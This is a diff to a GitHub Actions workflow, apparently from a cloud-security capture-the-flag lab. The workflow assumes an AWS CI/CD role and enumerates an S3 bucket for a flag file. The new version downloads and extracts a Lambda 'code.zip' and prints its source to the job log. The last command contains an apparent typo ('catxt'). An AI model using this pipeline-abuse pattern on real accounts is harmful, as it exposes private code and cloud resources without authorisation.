@@ -18,16 +18,23 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Check bucket
+      - name: Download Lambda code
         run: |
-          echo "=== IDENTITY ==="
-          aws sts get-caller-identity
+          echo "=== DOWNLOAD code.zip ==="
+          aws s3 cp s3://codec4f26c862a321ef5/code.zip ./code.zip
 
-          echo "=== LIST OBJECTS ==="
-          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5 --max-keys 20
+          echo "=== ZIP CONTENTS ==="
+          unzip -l ./code.zip
 
-          echo "=== FLAG ==="
-          aws s3api head-object --bucket codec4f26c862a321ef5 --key flag.txt || true
+          echo "=== EXTRACT ==="
+          mkdir lambda_code
+          unzip -q ./code.zip -d lambda_code
+
+          echo "=== FILES ==="
+          find lambda_code -type f -maxdepth 3 -print
+
+          echo "=== SOURCE ==="
+          find lambda_code -type f -maxdepth 3 -print0 | xargs -0 -r catxt || true
 
       - name: Check IAM
         run: |
